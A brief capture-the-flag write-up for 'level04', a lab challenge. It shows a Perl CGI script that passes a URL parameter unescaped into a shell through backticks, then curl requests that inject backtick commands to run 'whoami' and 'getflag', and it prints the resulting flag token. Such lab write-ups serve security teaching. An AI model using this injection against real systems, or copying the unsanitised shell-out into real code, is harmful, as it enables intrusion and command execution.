In this level we find a file .pl in the root. 

```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Then, in the script we can see a comment saying "localhost:4747".

If we try to run the command on this port :
``` curl '127.0.0.1:4747/level04.pl?x=`whoami`'
flag04
```

On this port we are allready logged as flag04, so we just need to execute 'getflag' this way :


``` curl '127.0.0.1:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```